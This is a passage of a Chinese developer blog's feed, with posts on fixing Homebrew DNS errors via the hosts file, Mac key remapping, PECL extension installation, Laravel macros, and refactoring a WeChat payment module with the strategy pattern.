        <content type="html"><![CDATA[<p>有时使用Homebrew 安装工具时，会出现类似下面的错误：</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh -C &quot;§(curl-fsSL https: &#x2F;&#x2F;raw.githubusercontent.com&#x2F;ohmyzsh&#x2F;ohmyzsh&#x2F;master&#x2F;tools&#x2F;install.sh)&quot; </span><br><span class="line"></span><br><span class="line">curl: (7) Failed to connect to raw.githubusercontent.com port 443: Connection refused</span><br></pre></td></tr></table></figure><p>这是因为github 的一些域名的 DNS 解析被污染，导致DNS 解析过程无法通过域名取得正确的IP地址。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>打开 <a href="https://www.ipaddress.com/" target="_blank" rel="noopener">https://www.ipaddress.com/</a> 输入访问不了的域名，或者在终端使用<code>ping</code> 命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ping raw.githubusercontent.com</span><br><span class="line">PING raw.githubusercontent.com (199.232.68.133): 56 data bytes</span><br><span class="line">64 bytes from 199.232.68.133: icmp_seq=0 ttl=49 time=226.190 ms</span><br><span class="line">64 bytes from 199.232.68.133: icmp_seq=1 ttl=49 time=325.860 ms</span><br><span class="line">c64 bytes from 199.232.68.133: icmp_seq=2 ttl=49 time=326.362 ms</span><br><span class="line">64 bytes from 199.232.68.133: icmp_seq=3 ttl=49 time=277.042 ms</span><br><span class="line">^C</span><br><span class="line">--- raw.githubusercontent.com ping statistics ---</span><br></pre></td></tr></table></figure><p>查询到正确的域名后，将其添加到对应的<code>hosts</code> 文件中即可。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220215222459.png" alt=""></p><p>添加完 <code>hosts</code> 配置之后，<code>homebrew</code> 就能正常了。</p><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><ul><li><a href="https://github.com/hawtim/hawtim.github.io/issues/10" target="_blank" rel="noopener">如何解决类似 curl: (7) Failed to connect to raw.githubusercontent.com port 443: Connection refused 的问题</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mac </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac 如何给键盘改键</title>
      <link href="/how-to-change-the-keyboard-on-a-mac/"/>
      <url>/how-to-change-the-keyboard-on-a-mac/</url>
      
        <content type="html"><![CDATA[<p>在Mac 上，可以使用 <a href="https://github.com/pqrs-org/Karabiner-Elements" target="_blank" rel="noopener">Karabiner-Elements</a> 进行改键，可以同时给笔记本和外接键盘进行改键，非常方便。</p><a id="more"></a><ul><li>系统：macOS Monterey 12.1</li><li>外接键盘：Keychron K6</li></ul><h2 id="简单改键"><a href="#简单改键" class="headerlink" title="简单改键"></a>简单改键</h2><p>Caps Lock 键占据了非常重要的位置，这个是没有办法接受的，所以需要将其替换成 Control 键。</p><p>打开 Karabiner-Elements，给予各种授权之后，直接在 <code>Simple modifications</code> 下面，选择需要替换的键。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220213162744.png" alt=""></p><h2 id="复杂改键"><a href="#复杂改键" class="headerlink" title="复杂改键"></a>复杂改键</h2><p>复杂改键通常是以组合的方式去修改，可以在 <a href="https://ke-complex-modifications.pqrs.org/" target="_blank" rel="noopener">Karabiner-Elements complex_modifications rules</a> 上查找自己想要的规则。</p><p>因为我的外接键盘是 Keychron K6，所以直接搜索键盘名称，就可以看到很多已经写好的规则，点击 Import。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220213162435.png" alt=""><br>导入之后，可以自行选择启用某个规则。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220213171820.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PECL 扩展库安装</title>
      <link href="/PECL-extension-library-installation/"/>
      <url>/PECL-extension-library-installation/</url>
      
        <content type="html"><![CDATA[<h1 id="PECL-扩展库安装"><a href="#PECL-扩展库安装" class="headerlink" title="PECL 扩展库安装"></a>PECL 扩展库安装</h1><p>通常安装 PHP 扩展，有两种方式：</p><ol><li>源码编译安装</li><li>通过  pecl 命令一键安装</li></ol><a id="more"></a><h2 id="源码编译安装"><a href="#源码编译安装" class="headerlink" title="源码编译安装"></a>源码编译安装</h2><p>源码编译安装的好处是更灵活，如果有进一步的需求，可以根据具体需要和版本，调整相关编译参数。</p><p>通常步骤如下：</p><ol><li>下载源码</li></ol><ul><li><a href="https://pecl.php.net" target="_blank" rel="noopener">RECL</a></li><li><a href="https://github.com/" target="_blank" rel="noopener">GitHub</a></li></ul><ol start="2"><li>从源码编译安装</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpize &amp;&amp; \</span><br><span class="line">./configure &amp;&amp; \</span><br><span class="line">make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure><ul><li><code>phpize</code>：来生成编译检测脚本</li><li><code>./configure</code>：来做编译配置检测</li><li><code>make</code>：进行编译</li><li><code>make install</code>：进行安装</li></ul><p>如果需要指定配置文件位置，可以增加<code>--with-php-config=/php-config-path</code> 参数。</p><ol start="3"><li>启用扩展</li></ol><p>编译安装到系统成功后，需要在 <code>php.ini</code> 中加入一行 <code>extension=extension.so</code> 来启用对应扩展。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extension</span> = extension.so</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 可以是绝对路径</span></span><br><span class="line"><span class="attr">extension</span> = <span class="string">"/php-config-path/extension.so"</span></span><br></pre></td></tr></table></figure><h2 id="PECL-命令行安装"><a href="#PECL-命令行安装" class="headerlink" title="PECL 命令行安装"></a>PECL 命令行安装</h2><p>PECL 发布时间通常指晚于 GitHub 发布时间。</p><p>对于已经收录到 PHP 官方扩展库的扩展，除了手动下载编译外，还可以通过 PHP 官方提供的 <code>pecl</code> 命令，一键下载安装。</p><ol><li>更新 pecl 库</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pecl channel-update pecl.php.net</span><br></pre></td></tr></table></figure><ol start="2"><li>使用 pecl 一键安装扩展</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pecl install mongodb</span><br></pre></td></tr></table></figure><ol start="3"><li>查看当前运行 php 配置文件位置</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php --ini</span><br></pre></td></tr></table></figure><ol start="4"><li>启用扩展</li></ol><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extension</span> = extension.so</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 可以是绝对路径</span></span><br><span class="line"><span class="attr">extension</span> = <span class="string">"/php-config-path/extension.so"</span></span><br></pre></td></tr></table></figure><ol start="5"><li>重启服务</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service php7.4-fpm restart</span><br><span class="line">php -m | grep mongodb</span><br><span class="line">php --ri mongodb</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Macro 基本使用</title>
      <link href="/basic-use-of-laravel-macro/"/>
      <url>/basic-use-of-laravel-macro/</url>
      
        <content type="html"><![CDATA[<p>在实际开发中，如果想扩展一个基础类，通常的做法是先继承该类，然后在此基础上进行扩展。</p><p>而本文要介绍的宏指令，是Laravel 根据PHP 的特性，编写了一套叫做 <code>Macroable</code> 的 <code>Traits</code>，可以在不使用继承的情况下进行扩展。</p><a id="more"></a><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>定义一个宏指令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line">Request::macro(<span class="string">"sayHi"</span>, <span class="function"><span class="keyword">function</span> <span class="params">($name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hi "</span> . $name . <span class="string">"!"</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>使用它：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line">Request::sayHi(<span class="string">"Boo"</span>);   <span class="comment">// Hi Boo!</span></span><br></pre></td></tr></table></figure><p>上面那个例子非常简单，再来看一个复杂一些的，将集合的数组全部转换为大写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Collection</span>;</span><br><span class="line"></span><br><span class="line">Collection::macro(<span class="string">'uppercase'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// $this-&gt;items 就相当于是集合的所有元素 ["hello", "world"]</span></span><br><span class="line">    <span class="keyword">return</span> collect(<span class="keyword">$this</span>-&gt;items)-&gt;map(<span class="function"><span class="keyword">function</span> <span class="params">($item)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strtoupper($item);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">collect([<span class="string">"hello"</span>, <span class="string">"world"</span>])-&gt;uppercase();   <span class="comment">// ["HELLO", "WORLD"]</span></span><br></pre></td></tr></table></figure><h3 id="关于Macro-的-this"><a href="#关于Macro-的-this" class="headerlink" title="关于Macro 的$this"></a>关于Macro 的$this</h3><p>这里有必要说一下<code>$this</code> 的指向，在上面那个集合的示例中，<code>$this</code> 并不是指向当前类，而是指向当前集合。</p><p>这是因为在 <code>Marcoable</code> 的源代码中，是可以看到 <code>static::$macros[$method]-&gt;bindTo($this, static::class)</code> 这段代码。而 <code>bindTo</code> 是改变 <code>$this</code> 上下文指向的方法。</p><h2 id="应该放在哪里"><a href="#应该放在哪里" class="headerlink" title="应该放在哪里"></a>应该放在哪里</h2><p>有两个地方可以用来存放有关宏指令的代码，分别是：</p><h3 id="利用composer-自动加载"><a href="#利用composer-自动加载" class="headerlink" title="利用composer 自动加载"></a>利用composer 自动加载</h3><p>第一种是使用通过 Composer autoload 的简单 PHP 文件。</p><p>可以在app 目录下新建一个叫做<code>macros.php</code> 的文件，然后编辑 <code>composer.json</code> 添加一个 <code>files</code>属性（注意相对路径 <code>app/macros.php</code>）：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">"autoload": &#123;</span><br><span class="line">    "psr-4": &#123;</span><br><span class="line">        "App\\": "app/"</span><br><span class="line">    &#125;,</span><br><span class="line">    "classmap": [</span><br><span class="line">        "database/seeds",</span><br><span class="line">        <span class="string">"database/factories"</span></span><br><span class="line">    ],</span><br><span class="line">    "files": [</span><br><span class="line">        <span class="string">"app/macros.php"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后运行 <code>composer dump-autoloader</code>。</p><p>这样新添加的文件将在运行时加载和执行，整个应用都可以使用其中的宏指令。</p><h3 id="利用服务提供者"><a href="#利用服务提供者" class="headerlink" title="利用服务提供者"></a>利用服务提供者</h3><p>创建一个 <code>ServiceProvider</code>，并注册在<code>config/app.php</code> 中，</p><p>比如创建一个集合的服务提供者，加入<code>boot</code> 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Providers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Collection</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">ServiceProvider</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CollectionMacroServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       Collection::macro(<span class="string">'uppercase'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> collect(<span class="keyword">$this</span>-&gt;items)-&gt;map(<span class="function"><span class="keyword">function</span> <span class="params">($item)</span> </span>&#123;</span><br><span class="line">              <span class="keyword">return</span> strtoupper($item);</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，整个应用就都可以访问到了。</p><h2 id="有哪些类可以使用Macro"><a href="#有哪些类可以使用Macro" class="headerlink" title="有哪些类可以使用Macro"></a>有哪些类可以使用Macro</h2><p>任何使用 <code>Macroable</code> Laravel 框架中的<code>Traits</code> 的类都可以使用宏，比如：</p><ul><li>Collection</li><li>Builder</li><li>Response</li><li>Rule</li><li>Request</li><li>Route</li><li>HTML</li><li>Form</li><li>Filesystem</li><li>Cache</li><li>Str</li><li>Arr</li><li>Translator</li><li>…</li></ul><p>Macro 是Laravel 中又一强大而被忽视的存在，合理地使用Macro 以实现更好的表达和复用。</p><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><ul><li><a href="https://learnku.com/laravel/t/2915/how-to-use-the-macro-method-to-extend-the-function-of-the-base-class-of-laravel" target="_blank" rel="noopener">如何利用 macro 方法来扩展 Laravel 的基础类的功能</a></li><li><a href="https://medium.com/@SlyFireFox/laravel-tip-5-examples-of-why-you-should-be-using-macros-90e015d1bce" target="_blank" rel="noopener">Laravel Tip: 5 examples of why you should be using Macros</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用组合重构支付模块</title>
      <link href="/reconstruct-the-payment-module-using-a-combination/"/>
      <url>/reconstruct-the-payment-module-using-a-combination/</url>
      
        <content type="html"><![CDATA[<p>最近技术老大给我留了一个课后作业，扔给我一段代码后，让我写一下这段代码有什么问题，以及该如何解决这些问题。</p><a id="more"></a><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 余额充值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pay</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 省略验参部分</span></span><br><span class="line">    Db::startTrans();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data[<span class="string">'order_no'</span>] = pay_order_no(<span class="keyword">$this</span>-&gt;uId);</span><br><span class="line">        $data[<span class="string">'title'</span>] = $recharge_package-&gt;title;</span><br><span class="line">        $data[<span class="string">'uid'</span>] = <span class="keyword">$this</span>-&gt;uId;</span><br><span class="line">        $data[<span class="string">'package_id'</span>] = $package_id;</span><br><span class="line">        $data[<span class="string">'money'</span>] = $recharge_package-&gt;money;</span><br><span class="line">        $data[<span class="string">'give_money'</span>] = $recharge_package-&gt;give_money;</span><br><span class="line">        $data[<span class="string">'sum_money'</span>] = $recharge_package-&gt;money+$recharge_package-&gt;give_money;</span><br><span class="line">        $data[<span class="string">'created_at'</span>] = date(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line">        $data[<span class="string">'updated_at'</span>] = date(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line">        RechargeOrderModel::create($data);</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;wechatPay($data);</span><br><span class="line">        Db::commit();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;success($result);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $exception) &#123;</span><br><span class="line">        Db::rollback();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error($exception-&gt;getMessage());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error(<span class="string">'支付失败'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 小程序微信支付</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">wechatPay</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $config = config(<span class="string">'pay.wechat'</span>);</span><br><span class="line">    $config[<span class="string">'notify_url'</span>] = request()-&gt;Domain(). <span class="string">'/api/v1.user/wechatNotify'</span>;</span><br><span class="line">    $open_id = <span class="keyword">$this</span>-&gt;request-&gt;param(<span class="string">"open_id"</span>);</span><br><span class="line">    $openId = <span class="keyword">isset</span>($open_id) ? $open_id : UsersModel::where(<span class="string">'uid'</span>,</span><br><span class="line">        $data[<span class="string">'uid'</span>])-&gt;value(<span class="string">'open_id'</span>);</span><br><span class="line">    $order = [</span><br><span class="line">        <span class="string">'out_trade_no'</span> =&gt; $data[<span class="string">'order_no'</span>],</span><br><span class="line">        <span class="string">'total_fee'</span>    =&gt; $data[<span class="string">'money'</span>]</span><br><span class="line">        <span class="string">'total_fee'</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">'body'</span>         =&gt; <span class="string">'余额充值'</span>,</span><br><span class="line">        <span class="string">'openid'</span>       =&gt; $openId,</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">return</span> Pay::wechat($config)-&gt;mini($order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="我看到的问题"><a href="#我看到的问题" class="headerlink" title="我看到的问题"></a>我看到的问题</h2><ol><li>支付部分不可复用。回调地址是硬编码，加上方法是私有的，当下一次其他业务需要微信支付时，只能将<code>wechatPay</code>方法手动再复制一份。</li><li>耦合较高。<code>RechargeOrderMode::create</code>  与 <code>wechatPay</code> 接收的是同一个参数。前者属于系统业务，后者属于第三方服务。如果其他业务需要调用微信支付，那调用者就得提前知道<code>wechatPay</code> 这个方法所接收的<code>data</code> 参数具体是什么。</li><li><code>wechatPay</code> 方法目前只支持小程序支付，如果需要对接扫码或者 App 支付，在此基础上扩展起来不方便。</li><li>异常捕获到之后没有记录，而是直接抛出了，不利于问题排查，另外就是服务端具体的异常信息无需让用户知道，应该抛出之前处理一下。</li></ol><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>涉及支付的地方，通常都会有订单。</p><p>创建订单和支付很像，创建订单可以有购买套餐、余额充值、开通会员等，而支付则可以有小程序支付、扫码支付、App 支付等。</p><p>可以使用策略模式来解决这个问题。策略模式用于将一组算法移到一个独立的类型中，然后通过简单工厂模式获取对应的策略对象。</p><p>下面试着来重构一下。</p><p>开发流程可以大致分为以下三块：</p><ol><li>创建支付订单</li><li>拉起支付</li><li>回调</li></ol><hr><h3 id="创建支付订单"><a href="#创建支付订单" class="headerlink" title="创建支付订单"></a>创建支付订单</h3><ol><li>创建一个抽象类 <code>PayOrderStrategy</code>，其中定义了抽象方法 <code>createOrder()</code>，其目的在于约束子类实现创建订单策略。</li><li>创建一个<code>Context</code>类，显式调用另一个对象的方法来执行请求。<code>Context</code> 类并不负责创建订单，它将这个任务交给了 <code>PayOrderStrategy</code> 的实现类。</li><li>创建一个获取策略的简单工厂，其作用在于根据不同的类型可以返回对应的策略对象。</li><li>定义策略。根据实际业务场景将对应的算法（业务逻辑）写在具体的策略类中。</li></ol><p>文件树状图如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">├── PayOrder &#x2F;&#x2F; 支付订单 Service</span><br><span class="line">│   ├── PayOrderContext.php    &#x2F;&#x2F; 联系上下文（调用者通过 Context 使用策略）</span><br><span class="line">│   ├── PayOrderStrategy.php   &#x2F;&#x2F; 定义抽象方法</span><br><span class="line">│   ├── PayOrderFactory.php    &#x2F;&#x2F; 获取策略</span><br><span class="line">│   └── Strategy &#x2F;&#x2F; 具体策略实现</span><br><span class="line">│       ├── VipStrategy.php    &#x2F;&#x2F; 开通vip 策略</span><br><span class="line">│       ├── ...  &#x2F;&#x2F; 其他策略</span><br></pre></td></tr></table></figure><p>可以看到，这种结构的一个优点是各个类的职责更加集中，<code>VipStrategy</code> 对象只负责创建 VIP 订单的策略，<code>PayOrderFactory</code>  只负责实例化对象，<code>PayOrderContext</code> 则只负责管理支付订单。</p><p>相比只使用继承，组合对象能够使代码更加灵活，因为对象能够以多种方式动态地组合来处理任务。</p><h3 id="拉起支付"><a href="#拉起支付" class="headerlink" title="拉起支付"></a>拉起支付</h3><p>支付的核心逻辑和上面差不多。</p><p>文件树状图如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">├──Payment </span><br><span class="line">│   ├── PaymentContext.php  </span><br><span class="line">│   ├── PaymentFactory.php  </span><br><span class="line">│   ├── PaymentStrategy.php </span><br><span class="line">│   └── Strategy           &#x2F;&#x2F; 支付策略</span><br><span class="line">│       ├── Wechat  &#x2F;&#x2F; 微信支付策略</span><br><span class="line">│           ├── AppStrategy.php    &#x2F;&#x2F; App 支付</span><br><span class="line">│           ├── MiniStrategy.php   &#x2F;&#x2F; 小程序支付</span><br><span class="line">│           ├── ScanStrategy.php   &#x2F;&#x2F; 扫码支付</span><br><span class="line">│           ├── ...    &#x2F;&#x2F; 其他策略</span><br></pre></td></tr></table></figure><h3 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h3><p>回调就不用多说了。</p><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="订单模块"><a href="#订单模块" class="headerlink" title="订单模块"></a>订单模块</h3><p><code>PayOrder/PayOrderStrategy.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">PayOrder</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">PayOrderStrategy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createOrder</span><span class="params">(array $data)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PayOrder/PayOrderContext.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">PayOrder</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PayOrderContext</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> PayOrderStrategy $strategy;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(PayOrderStrategy $strategy)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;strategy = $strategy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createOrder</span><span class="params">(array $data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;strategy-&gt;createOrder($data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PayOrder/PayOrderFactory.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">PayOrder</span>;</span><br><span 